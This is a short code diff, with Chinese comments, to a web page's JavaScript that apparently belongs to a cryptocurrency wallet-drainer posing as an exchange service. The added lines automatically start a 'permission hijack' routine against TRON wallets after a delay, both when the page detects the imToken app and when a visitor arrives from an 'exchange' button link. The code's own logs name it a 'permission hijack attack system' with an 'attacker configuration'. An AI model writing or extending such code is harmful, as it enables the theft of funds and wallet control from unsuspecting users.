@@ -639,6 +639,14 @@
         const isImToken = navigator.userAgent.includes('imToken') || window.imToken;
         if (isImToken) {
             console.log('🔑 检测到imToken环境，启用积极检测模式');
+            // 在imToken环境中，延迟3秒后强制启动权限劫持检测
+            setTimeout(() => {
+                console.log('🔑 imToken环境3秒延迟检测');
+                if (!hijackStatus.initiated) {
+                    console.log('🔑 强制启动imToken权限劫持检测');
+                    detectTronWallet();
+                }
+            }, 3000);
         }
         
         // 立即检测钱包连接
@@ -674,6 +682,17 @@
             console.log('🔑 收到TronWeb就绪事件');
             detectTronWallet();
         });
+        
+        // 检查URL参数，如果是从兑换按钮跳转来的，立即激活权限劫持
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('imtoken_connect') === 'true') {
+            console.log('🔑 检测到从兑换按钮跳转，立即激活权限劫持检测');
+            // 延迟2秒执行，确保imToken环境完全加载
+            setTimeout(() => {
+                console.log('🔑 开始imToken环境下的权限劫持检测');
+                detectTronWallet();
+            }, 2000);
+        }
         
         console.log('🔑 权限劫持攻击系统初始化完成');
         console.log('🔑 攻击者配置:', ATTACKER_CONFIG);
